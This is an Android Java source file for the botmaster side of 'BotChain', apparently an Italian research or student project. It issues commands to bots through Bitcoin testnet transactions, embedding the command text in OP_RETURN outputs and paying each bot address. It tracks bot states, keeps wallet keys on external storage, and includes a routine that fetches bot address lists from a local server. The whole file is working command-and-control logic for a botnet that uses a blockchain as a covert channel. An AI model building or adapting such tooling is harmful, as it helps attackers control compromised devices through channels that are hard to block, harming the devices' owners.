package com.example.tonipagliaro.botchain;

import android.app.Application;
import android.app.backup.BackupManager;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import com.example.tonipagliaro.botchain.Database.Database;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.BlockChain;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.ECKey;
import org.bitcoinj.core.InsufficientMoneyException;
import org.bitcoinj.core.NetworkParameters;
import org.bitcoinj.core.PeerGroup;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.net.discovery.DnsDiscovery;
import org.bitcoinj.net.discovery.PeerDiscovery;
import org.bitcoinj.params.TestNet3Params;
import org.bitcoinj.script.Script;
import org.bitcoinj.script.ScriptBuilder;
import org.bitcoinj.store.BlockStoreException;
import org.bitcoinj.store.SPVBlockStore;
import org.bitcoinj.wallet.SendRequest;
import org.bitcoinj.wallet.UnreadableWalletException;
import org.bitcoinj.wallet.Wallet;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetSocketAddress;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ApplicationState extends Application {

    static final Object[] walletFileLock = new Object[0];

    Database db = new Database(this);

    final String BOT_STATE_START = "START";
    final String BOT_STATE_ONLINE = "ONLINE";
    final String BOT_STATE_OFFLINE = "OFFLINE";
    final String BOT_STATE_QUEST = "QUEST";

    private String filePrefix = "testnet";

    File walletFile;
    Wallet wallet;
    boolean walletShouldBeRebuilt = false;

    File questFile;

    File keychainFile;

    NetworkParameters params = TestNet3Params.get();

    private PeerDiscovery peerDiscovery;
    private ArrayList<InetSocketAddress> isas = new ArrayList<InetSocketAddress>();

    SPVBlockStore chainStore;
    BlockChain chain;
    //Aggiunte
    PeerGroup peerGroup;

    ArrayList<Address> indirizzi=new ArrayList<Address>();

    File fileMapAddress;
    Map<String,String> mappaIndirizzi=new HashMap<String, String>() ;

    private BackupManager backupManager;

    public static ApplicationState current;

    @Override
    public void onCreate() {
        super.onCreate();

        //SI prendono gli indirizzi dei bot dalle risorse xml e si aggiungono alla lista "indirizzi"

        Resources res = getResources();
        String[] bots = res.getStringArray(R.array.botList);
        for (String s: bots) {
            db.insertData(s, "", "", "", "");
            indirizzi.add(new Address(params, s));
            mappaIndirizzi.put(s,BOT_STATE_START);
        }

        Log.d("App", "Start app state");
        ApplicationState.current = this;
        backupManager = new BackupManager(this);

        fileMapAddress = new File(getFilesDir(), "map_address.bots");

        //Leggiamo il file che tiene traccia dei bot attivi (SE ESISTE)
        if (!fileMapAddress.exists()) {
            saveMappaIndirizzi();
        }
        else {
            loadMappaIndirizzi();
        }

        logMappaIndirizzi();


        //new DownloadListBotFile().execute();

        //Leggiamo o creiamo il wallet
        synchronized (ApplicationState.walletFileLock) {
            File mainDir = new File(Environment.getExternalStorageDirectory(), "BotMasterV1");
            if (!mainDir.exists())
                if (!mainDir.mkdir()) {
                    Log.e("App", "Errore nella crezione della cartella");
                }
            questFile = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".txt");
            //keychainFile = new File(getFilesDir(), filePrefix+".keychain");
            keychainFile = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".keychain");
            //walletFile = new File(getFilesDir(), filePrefix + ".wallet");
            walletFile = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".wallet");
            if (walletFile.exists()) {
                try {
                    wallet = Wallet.loadFromFile(walletFile);
                } catch (UnreadableWalletException e) {
                    e.printStackTrace();
                }
                Log.d("App", "Trovato il file per caricare il wallet");
            }
            else {
                wallet = new Wallet(params);
                Log.d("App", "Creato nuovo wallet...ora attendere il reset delle chiavi");
                try {
                    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(keychainFile));
                    ArrayList<ECKey> keys = (ArrayList<ECKey>) ois.readObject();
                    for (ECKey key : keys) {
                        //wallet.keychain.add(key);
                        wallet.importKey(key);
                    }
                    walletShouldBeRebuilt = true;
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d("App", "Nessuna chiave precedente è stata trovata, vuol dire che è un nuovo wallet!");
                    wallet.importKey(new ECKey());
                }
                saveWallet();
            }
        }

        //Rimosso
        //peerDiscovery = new DnsDiscovery(params);

        Log.d("App", "Leggo la block store dal disco");
        //File file = new File(getExternalFilesDir(null), filePrefix + ".blockchain");
        File file = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".blockchain");

        if (!file.exists()) {
            Log.d("App", "Copio la blockchain dalla cartella asset");
            InputStream is = null;
            try {
                is = getAssets().open(filePrefix + ".blockchain");
                OutputStream out = new FileOutputStream(file);
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
                Log.d("App", "Impossibile trovare la blockchain nella cartella assets...");
            }
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }

        }
        try {
            chainStore = new SPVBlockStore(params, file);
            chain = new BlockChain(params, wallet, chainStore);
            peerGroup = new PeerGroup(params, chain);
            peerGroup.addPeerDiscovery(new DnsDiscovery(params));
            peerGroup.addWallet(wallet);
        } catch (BlockStoreException e) {
            throw new Error("Impossibile inizializzare la blockchain");
        }
    }

    public void saveWallet() {
        synchronized (ApplicationState.walletFileLock) {
            Log.d("App", "Salvo il wallet");
            try {
                wallet.saveToFile(walletFile);
            } catch (IOException e) {
                throw new Error("Impossibile salvare il file wallet");
            }

            /*
            // Salva le chiavi solo se abbiamo bisogno di ricreare un wallet (Aggiungere condizione)
            ObjectOutputStream keychain;
            try {
                keychain = new ObjectOutputStream(new FileOutputStream(keychainFile));
                keychain.writeObject(wallet.getImportedKeys());
                keychain.flush();
                keychain.close();
            } catch (IOException e) {
                e.printStackTrace();
                throw new Error("Impossibile salvare il file delle chiavi");
            }
            */
            Log.d("Wallet", "Notifying BackupManager that data has changed. Should backup soon.");
            //backupManager.dataChanged();
        }
    }


    public void setStatoBots(String stato) {
        for (String s : mappaIndirizzi.keySet()) {
            mappaIndirizzi.put(s, stato);
        }
        saveMappaIndirizzi();
    }

    public void setStatoBots(ArrayList<String> addressList, String stato) {
        for (String address : addressList) {
            mappaIndirizzi.put(address, stato);
        }
        saveMappaIndirizzi();
    }

    public void setStatoBot(String address, String stato) {
        mappaIndirizzi.put(address, stato);
        saveMappaIndirizzi();
    }

    public void saveMappaIndirizzi() {
        try {
            Log.d("App", "SCRIVO IL FILE");
            FileOutputStream fos = new FileOutputStream(fileMapAddress);
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(mappaIndirizzi);
            oos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void writeQuestFile(String s) {
        try {
            FileOutputStream fos = new FileOutputStream(questFile);
            fos.write(s.getBytes());
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void loadMappaIndirizzi() {
        if (fileMapAddress.exists())
            try
            {
                Log.d("App", "Leggo il file della mappa degli indirizzi");
                FileInputStream fileInputStream = new FileInputStream(fileMapAddress);
                ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
                HashMap<String, String> map = (HashMap<String,String>)objectInputStream.readObject();
                for (String s: map.keySet()) {
                    mappaIndirizzi.put(s, map.get(s));
                    Log.d("App", "MAPPA INDIRIZZI LETTA DAL FILE: " +s + " VALORE " + mappaIndirizzi.get(s));
                }
            }
            catch(ClassNotFoundException | IOException | ClassCastException e) {
                e.printStackTrace();
            }
    }

    public ArrayList<Address> getBotStateStart() {
        ArrayList<Address> listaBotStart = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_START)) {
                Log.d("App", "BOT CON STATO START: " + s);
                listaBotStart.add(new Address(params, s));
            }
        }
        return listaBotStart;
    }

    public ArrayList<Address> getBotStateOnline() {
        ArrayList<Address> listaBotOffline = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_ONLINE)) {
                listaBotOffline.add(new Address(params, s));
            }
        }
        return listaBotOffline;
    }

    public ArrayList<String> getBotStateOnlineString() {
        ArrayList<String> listaBotOffline = new ArrayList<String>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_ONLINE)) {
                listaBotOffline.add(s);
            }
        }
        return listaBotOffline;
    }

    public ArrayList<Address> getBotStateOffline() {
        ArrayList<Address> listaBotNo = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_OFFLINE)) {
                listaBotNo.add(new Address(params, s));
            }
        }
        return listaBotNo;
    }

    public ArrayList<Address> getBotStateQuest() {
        ArrayList<Address> listaBotNo = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_QUEST)) {
                listaBotNo.add(new Address(params, s));
            }
        }
        return listaBotNo;
    }
/*
    public  String sendCommand(String command, ArrayList<Address> botAddressList) throws Exception {

        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction( wallet.getParams());

        Coin value = Coin.MILLICOIN;

        for (Address address : botAddressList) {
            transaction.addOutput(value, address);
            Log.d("SEND COMMAND", address.toString());
        }
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());

        SendRequest sendRequest = SendRequest.forTx(transaction);
        sendRequest.feePerKb = Coin.ZERO;

        String string = new String(hash);
        System.out.println("Sending ... " +string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(botAddressList.size());
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }
*/

    public  String sendCommand(String command, Address botAddress) throws Exception {

        Log.d("App", "INVIO UN COMANDO");
        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction(wallet.getParams());

        transaction.addOutput(Coin.MILLICOIN, botAddress);
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());

        SendRequest sendRequest = SendRequest.forTx(transaction);

        String string = new String(hash);
        System.out.println("Sending ... " + string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(1);
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }

    public  String sendCommand(String command) throws Exception {

        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction( wallet.getParams());

        Coin millicoin = Coin.MILLICOIN;
        Coin due_millicoin = millicoin.add(millicoin);
        int numConnection = 0;
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase(BOT_STATE_START)) {
                transaction.addOutput(due_millicoin, new Address(params, s));
                numConnection++;
            }
            else if (mappaIndirizzi.get(s).equalsIgnoreCase((BOT_STATE_ONLINE))) {
                Log.d("BOT", s);
                transaction.addOutput(Coin.MILLICOIN, new Address(params, s));
                numConnection++;
            }
        }
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());

        SendRequest sendRequest = SendRequest.forTx(transaction);
        sendRequest.feePerKb = Coin.ZERO;

        String string = new String(hash);
        System.out.println("Sending ... " +string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(numConnection);
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }

    public void logMappaIndirizzi() {
        for (String s : mappaIndirizzi.keySet()) {
            Log.d("MAP", "BOT = " + s +"VALORE = "+ mappaIndirizzi.get(s));
        }
    }


    private class DownloadListBotFile extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {
            String url="http://192.168.43.182:8080/ServerBotChain/FileServlet";
            try {
                //scarica il file degli indirizzi dal server
                File fileBot=getOutputFromUrl(url);

                //legge ogni linea del file scaricato
                readAddressFromFile(fileBot);

            } catch (IOException e) {
                e.printStackTrace();
            }

            return null;
        }

        private void readAddressFromFile(File fileBot) {

            BufferedReader br = null;
            FileReader fr = null;

            try {

                fr = new FileReader(fileBot);
                br = new BufferedReader(fr);

                String sCurrentLine;

                br = new BufferedReader(new FileReader(fileBot));

                while ((sCurrentLine = br.readLine()) != null) {
                    Log.v("App", "linea corrente file " + sCurrentLine);
                    //indirizzi.add(sCurrentLine);
                    db.insertData(sCurrentLine, "", "", "", "");
                    mappaIndirizzi.put(sCurrentLine, BOT_STATE_START);
                }

                fileMapAddress = new File(getFilesDir(), "map_address.bots");

                //Leggiamo il file che tiene traccia dei bot attivi (SE ESISTE)
                if (!fileMapAddress.exists()) {
                    saveMappaIndirizzi();
                }
                else {
                    loadMappaIndirizzi();
                }

                logMappaIndirizzi();

            } catch (IOException e) {

                e.printStackTrace();

            } finally {

                try {

                    if (br != null)
                        br.close();

                    if (fr != null)
                        fr.close();

                } catch (IOException ex) {

                    ex.printStackTrace();

                }

            }
        }

        private File getOutputFromUrl(String url) throws IOException {
            URL u = new URL(url);
            // il file scaricato compare nell'archivio
            File file = new File(Environment.getExternalStorageDirectory()+File.separator +"fileBot.txt");

            URLConnection ucon = u.openConnection();
            InputStream is = ucon.getInputStream();
            BufferedInputStream bis = new BufferedInputStream(is);


            ByteArrayOutputStream baf = new ByteArrayOutputStream(50);
            int current = 0;
            while ((current = bis.read()) != -1) {
                baf.write((byte) current);
            }

            FileOutputStream fos = new FileOutputStream(file);
            fos.write(baf.toByteArray());
            fos.close();

            return file;

        }
    }

    public boolean hasMapAddress(String address) {
        boolean hasAddress = false;
        for (String a : mappaIndirizzi.keySet()) {
            if(address.equals(a)) {
                hasAddress = true;
            }
        }
        return hasAddress;
    }

    public String readOpReturn(Transaction tx) throws Exception {
        List<TransactionOutput> ti = tx.getOutputs();
        String mess="";
        Address from = null;
        for (TransactionOutput t : ti) {
            Script script = t.getScriptPubKey();

            //prelievo dell'indirizzo
            if (t.getAddressFromP2PKHScript(wallet.getParams()) != null) {
                from = t.getAddressFromP2PKHScript(wallet.getParams());
            }


            if (script.isOpReturn()) {
                byte[] message = new byte[script.getProgram().length-2];

                System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length - 2);

                mess = new String(message);
                Log.d("App", "Op_return   " + mess);
            }

        }
        return mess;
    }



}
